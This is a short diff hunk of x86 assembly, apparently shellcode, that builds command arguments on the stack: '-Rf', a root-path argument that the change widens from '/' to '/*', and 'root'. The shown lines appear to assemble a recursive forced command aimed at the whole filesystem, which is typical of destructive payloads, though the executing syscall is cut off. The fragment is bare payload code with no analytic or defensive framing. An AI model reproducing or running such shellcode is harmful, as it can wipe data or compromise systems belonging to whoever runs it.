@@ -40,7 +40,7 @@ _start:
 	push 0x66522d			; "fR-"
 	mov esi, esp			; store pointer to "fR-" temporarily
 	push eax			; null terminate the array value
-	push byte 0x2f			; "/" onto stack
+	push word 0x2a2f		; "/*" onto stack
 	mov edi, esp			; store pointer to "/"
 	push eax			; null terminator onto stack
 	push 0x746f6f72			;
